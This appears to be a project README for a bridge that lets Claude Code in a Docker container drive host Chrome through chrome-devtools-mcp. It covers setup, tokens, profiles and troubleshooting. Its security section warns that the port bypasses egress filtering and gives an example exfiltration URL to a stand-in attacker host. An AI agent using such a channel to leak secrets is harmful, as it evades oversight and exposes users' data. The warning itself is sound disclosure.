# Chrome DevTools MCP

Let Claude Code drive a real Chrome through the
[`chrome-devtools-mcp`](https://github.com/ChromeDevTools/chrome-devtools-mcp) server — navigate
pages, run scripts, take screenshots, inspect the DOM and network.

## Why a host-side server?

The container has no browser and no display, and `chrome-devtools-mcp` is a **stdio** server that
launches and drives a real Chrome. So — like the [sound server](sound-effects.md) and the [docker
bridge](docker-bridge.md) — it runs on the **host**, reached over HTTP via `host.docker.internal`.

Since the server speaks stdio only, a **zero-dependency Node bridge**
(`chrome-devtools-mcp/host-chrome-devtools-mcp.js`, node built-ins only) translates MCP's Streamable
HTTP transport to stdin/stdout: it spawns `chrome-devtools-mcp`, forwards each HTTP request to its
stdin, and streams the matching JSON-RPC responses back as Server-Sent Events. It listens on
`0.0.0.0:9333` so the Docker host gateway is reachable (`127.0.0.1` is not), and traffic to
`host.docker.internal` bypasses Squid — see [Host-Outbound Ports](host-outbound-ports.md).

```
HOST:  Chrome  <-- chrome-devtools-mcp (stdio, one per session)
              <-- host-chrome-devtools-mcp.js  -->  http://0.0.0.0:9333/mcp
                    reads <config-dir>/projects/<key>/chrome-devtools.token
CONTAINER:  claude --mcp-config  -->  http://host.docker.internal:9333/mcp
                                      Authorization: Bearer <per-project token>
                                      X-Claude-Profile: <profile label>
```

Each session owns one Chrome and several run at once, so concurrent containers do not fight over one
browser (default cap 4, `CHROME_DEVTOOLS_MCP_MAX_SESSIONS`). Who gets which browser is decided
host-side, in this order:

1. **Bearer token, required.** The token also *identifies the project*: it is read from
   `<config-dir>/projects/<key>/chrome-devtools.token`. The container never asserts which project it
   is — the same model as the [docker bridge](docker-bridge.md).
2. **Profile label** (`X-Claude-Profile`, default `default`) names a profile *inside* that project.
   The token bounds the namespace, so a client can only ever name its own profiles.
3. **A live session keeps its label.** A second session asking for a label already in use gets a
   throwaway profile instead of evicting a running Chrome.

## Setup

### 1. Start the bridge on your host

```bash
./chrome-devtools-mcp/host-chrome-devtools-mcp.sh
```
Or install it as a launchd agent so it starts at login. `install` rewrites the plist's
`ProgramArguments` to point at this checkout, so there is nothing to edit by hand:
```bash
make -C chrome-devtools-mcp install
```
`make -C chrome-devtools-mcp help` lists the rest — `status` (loaded / listening / tokens seen),
`restart`, `log` and `logs`, `profiles`, `smoke PROJECT=…`. Logs go to
`/tmp/claude-chrome-devtools-mcp.log`.

**Restart after changing the bridge or your config dir**, with `make -C chrome-devtools-mcp restart`
(`launchctl kickstart -k gui/$(id -u)/com.user.claude-chrome-devtools-mcp`). That re-runs the
wrapper, which is what exports `CID_PROJECTS_DIR` — the plist does not carry it. Only a change to
the plist itself needs a full `install` (`bootout` + `bootstrap`).

### 2. Add the server to `mcp-servers.json`

In the config dir (or a per-project `<config-dir>/projects/<key>/mcp-servers.json`), inside
`mcpServers`:
```json
"chrome-devtools": {
   "type": "http",
   "url": "http://host.docker.internal:9333/mcp",
   "headers": {
     "Authorization": "Bearer ${CHROME_DEVTOOLS_MCP_TOKEN}",
     "X-Claude-Profile": "${CLAUDE_CHROME_PROFILE}"
   }
}
```
Claude Code expands both from the container env, where `run.sh` puts them. Like the docker bridge's
entry this is deliberately **not** in `templates/mcp-servers.json` — with the bridge disabled it
would show as a failed MCP server on every run, which just teaches you to ignore MCP errors.

### 3. Launch with the bridge enabled

```bash
CLAUDE_CHROME_DEVTOOLS=1 ./run.sh
```
That switch mints the per-project token if absent (mode `600`), forwards it and the profile label,
and opens the firewall port. With it unset there is **no `OUTPUT` rule for the port**, so the
container cannot reach the bridge even if the host daemon is running. Put it in a per-project
`.claude-env` — see [Per-Project Launch Config](per-project-env.md).

## Profiles

Each project gets a persistent Chrome profile, so logins and cookies survive across sessions:

```
~/.cache/claude-in-docker/chrome-profiles/
  myproj/default/      <- plain `./run.sh`, every time
  myproj/review/       <- CLAUDE_CHROME_PROFILE=review ./run.sh
  otherproj/default/
```

The directory is `<profile-root>/<project-key>/<label>`. The key comes from the token, the label from
`CLAUDE_CHROME_PROFILE` (default `default`, `[A-Za-z0-9._-]{1,64}`; anything else is a `400`). Move
the root with `CHROME_DEVTOOLS_MCP_PROFILE_ROOT` — it defaults under `~/.cache` rather than the
config dir because these are churny multi-hundred-MB binary trees, not config.

Two containers on **one** project want two labels: run the second with
`CLAUDE_CHROME_PROFILE=review`. Chrome locks a user-data-dir to one process, so if both ask for
`default` the second session falls back to a temporary profile and the log says so:

```
profile 'default' in use by an active session; using a temp profile.
Set CLAUDE_CHROME_PROFILE to keep state.
```

The first browser is never killed for the second. A label counts as in use only while **a browser is
running** or **a client is still connected** on its GET stream — not merely while a session object
exists. "A browser is running" means Chrome's own `SingletonLock` names a pid that `ps` still reports
as a Chrome: the lock survives anything but a clean quit, and this bridge kills the server out from
under its browser, so a leftover lock is the normal case. Checking only that the pid is alive would
hand the profile to whatever process later inherits that number — permanently. That distinction matters because the server is
spawned at `initialize` while Chrome launches lazily on first tool use, so a session can hold a label
for a long time with no browser behind it. A claim failing both tests is stale: the next session
reclaims the profile and the abandoned server is killed, so it can never launch Chrome onto a
directory that has been handed over.

```
reclaiming profile 'default' from a session with no running browser
```

This is what makes a reconnect safe. Without it, a client whose browser you closed would come back
onto a temp profile and silently lose whatever it did there.

Set `CHROME_DEVTOOLS_MCP_PROFILE=off` on the host to go back to a throwaway profile for every
session.

## Port and Chrome flags

- **Port** defaults to `9333`; override with `CHROME_DEVTOOLS_MCP_PORT`, read by **both** the bridge
  and `run.sh`, so it is auto-merged into the firewall when the bridge is on — keep it in sync with
  the `url` in `mcp-servers.json`.
- **Chrome flags** — the bridge launches with `--no-usage-statistics` (no Google telemetry) plus the
  per-session profile flag. Add others (`--channel`, `--executablePath`, `--no-performance-crux`)
  via space-separated `CHROME_DEVTOOLS_MCP_EXTRA_ARGS`; see
  `npx -y chrome-devtools-mcp@latest --help`. Do not put `--isolated` or `--user-data-dir` there —
  the bridge owns those.
- **Server command / version** — by default the bridge fetches the server per launch with
  `npx -y chrome-devtools-mcp@latest`. Pin with `CHROME_DEVTOOLS_MCP_VERSION`, or bypass `npx`
  entirely by pointing `CHROME_DEVTOOLS_MCP_CMD` at a pre-installed binary — which also skips the
  launch-time registry round-trip (see [Troubleshooting](#troubleshooting)).

## File outputs

Tools taking a `filePath` (`take_screenshot`, `performance_start_trace`, `take_heapsnapshot`,
`evaluate_script`) write to the **host** filesystem where the bridge runs, not the container
workspace, and unless the client negotiates the MCP `roots` capability those writes are confined to
the OS temp dir. Inline results (screenshots and snapshots returned in the tool response) flow back
to Claude normally; only explicit `filePath` saves land host-side.

## Security

Read this before enabling. Same caveats as [Host-Outbound
Ports](host-outbound-ports.md#caveats), amplified because the port carries browser automation:

- **Bypasses the egress allowlist entirely.** Traffic to `host.docker.internal` skips Squid, so
  `allowed-domains.txt` does **not** apply to port `9333`. The firewall port rule is the only control.
- **The port is a full browser-automation endpoint.** The host Chrome can navigate anywhere, execute
  arbitrary JavaScript, and read/screenshot pages. Exposing it hands the in-container agent an
  unfiltered egress and exfiltration channel (e.g. `https://attacker.example/?leak=<secret>`) outside
  this project's core control. A deliberate hole — enable it knowingly.
- **Profiles persist.** A project's browser keeps whatever you log into it, and the agent drives
  that browser. Treat a profile as credentials the agent holds: use throwaway or dev accounts, or
  `CHROME_DEVTOOLS_MCP_PROFILE=off` for a clean profile every session. Either way this is a profile
  control, not a network one — it does not restrict which sites Chrome can reach.
- **Runs as the host user**, so Chrome can reach host-local and LAN services the container cannot.
- **The bearer token is the only authentication**, and the bridge binds `0.0.0.0` by necessity.
  Anything on the host or its LAN that holds a project's token can drive that project's browser;
  the token file is mode `600`, so guard it as you would `docker-bridge.token`.
- **Telemetry leaves the host, unfiltered.** `chrome-devtools-mcp` sends usage statistics to Google
  and its performance tools send trace URLs to the CrUX API — host egress bypassing Squid. The bridge
  passes `--no-usage-statistics`; add `--no-performance-crux` via `CHROME_DEVTOOLS_MCP_EXTRA_ARGS` to
  suppress the CrUX calls too.
- **Enable only when needed.** `launchctl bootout` the service (or drop the port) when not using it.

## Verification

1. Start the bridge; tail `/tmp/claude-chrome-devtools-mcp.log` for
   `streamable-HTTP bridge on 0.0.0.0:9333/mcp` and `N project token(s) loaded`.
2. Confirm it binds all interfaces, not loopback — expect `*:9333`; a `127.0.0.1:9333` result means
   the container cannot reach it:
   ```bash
   lsof -nP -iTCP:9333 -sTCP:LISTEN
   ```
3. Confirm the endpoint answers on the host. An unauthenticated request proves it is up (`401`),
   versus connection-refused:
   ```bash
   curl -sv http://localhost:9333/mcp
   ```
   Or run the full handshake (initialize → `tools/list` → teardown) against the real server for one
   project; it should print a session id and the tool list:
   ```bash
   ./chrome-devtools-mcp/smoke-test.sh ~/code/my-project
   ```
4. Add the `mcp-servers.json` entry, then launch `CLAUDE_CHROME_DEVTOOLS=1 ./run.sh`. The
   `init-firewall.sh` output should show an `OUTPUT` accept rule for `9333` alongside `4767`.
5. From a container shell, `curl -sv http://host.docker.internal:9333/mcp` should get a `401` (the
   token lives in the MCP config, not your shell).
6. In Claude Code, `/mcp` should list `chrome-devtools` as connected with its tools enumerated
   (Chrome launches on first tool use).
7. Ask Claude to navigate to `https://example.com` and take a snapshot; a real Chrome should appear
   on the host and the tool should return page content.
8. Repeat 4-7 in a second project while the first is still running: two browsers, two profile
   directories under `~/.cache/claude-in-docker/chrome-profiles/`, neither killed by the other.

## Troubleshooting

### Every call returns 401

The token is now **required** — an `mcp-servers.json` entry without the `Authorization` header is
refused on every call. If you configured this bridge before tokens existed, add the two headers from
[step 2](#2-add-the-server-to-mcp-serversjson), launch with `CLAUDE_CHROME_DEVTOOLS=1` to mint the
token, and `make -C chrome-devtools-mcp restart` so a bridge started earlier picks up
`CID_PROJECTS_DIR`. `make -C chrome-devtools-mcp status` shows whether it found any tokens.

Otherwise the container's `CHROME_DEVTOOLS_MCP_TOKEN` no longer matches any
`<config-dir>/projects/*/chrome-devtools.token` — usually the token file was deleted or the config
dir moved. `CLAUDE_DOCKER_CONFIG_DIR` / `CLAUDE_PROJECTS_DIR` must resolve identically for `run.sh`
and the bridge (the launcher derives them from `scripts/paths.sh`, so a mismatch means the two were
started with different env). Restart the session after rotating a token.

### The browser starts logged out, or customisations vanish

You are on a temp profile: another session holds the label with a **running browser** or a connected
client, so give this container its own — `CLAUDE_CHROME_PROFILE=review ./run.sh`. Confirm with
`grep 'temp profile' /tmp/claude-chrome-devtools-mcp.log`, and check whether the profile has ever
been written: `make -C chrome-devtools-mcp profiles` reporting `0B` means Chrome never attached to
it. See [Profiles](#profiles).

### `npm error code E401` / auth failures with a private npm registry

**Symptom.** The bridge listens fine, but the first Chrome tool call fails and the log shows an npm
auth error such as `npm error code E401 Incorrect or missing password`.

**Cause.** By default the bridge runs `npx -y chrome-devtools-mcp@latest`, resolving through your
**default** npm registry. If `~/.npmrc` points at a private registry authenticating with a token from
an env var — e.g.

```
registry=https://registry.example.com/npm/
//registry.example.com/npm/:_authToken=${MY_NPM_TOKEN}
```

— then `${MY_NPM_TOKEN}` must exist in the environment npm runs in. It does in your interactive
shell, but **not under launchd**, which gives a minimal environment with no shell rc. Note `@latest`
re-resolves against the registry on **every** session start, so pre-warming the npx cache does not
avoid the auth round-trip.

**Fix A — pre-install the server, skip the registry at launch (recommended).** Install once from your
interactive shell, then point the bridge at the binary so it never invokes `npx`:

```sh
npm i -g chrome-devtools-mcp            # token comes from your shell env
which chrome-devtools-mcp               # e.g. ~/.nvm/versions/node/<ver>/bin/chrome-devtools-mcp
```

Add to the launchd plist's top-level `<dict>` (then `bootout` + `bootstrap` to reload):

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>CHROME_DEVTOOLS_MCP_CMD</key>
    <string>chrome-devtools-mcp</string>
</dict>
```

The bare name resolves because the wrapper sources nvm and puts that version's bin on `PATH`; use an
absolute path to avoid depending on the nvm default. Trade-off: you now update the server manually.

**Fix B — give the token to launchd, keep `@latest`.** Export it in the wrapper
`host-chrome-devtools-mcp.sh` before it `exec`s node, reading from the Keychain or a mode-`600` file:

```sh
export MY_NPM_TOKEN="$(security find-generic-password -s my-npm-token -w)"
```

Avoid the plist's `EnvironmentVariables` (world-readable plaintext) or `launchctl setenv` (leaks into
the whole launchd session).

The same cause and fixes apply to the [sound server](sound-effects.md) only if you give it private
package dependencies; by default it has none.
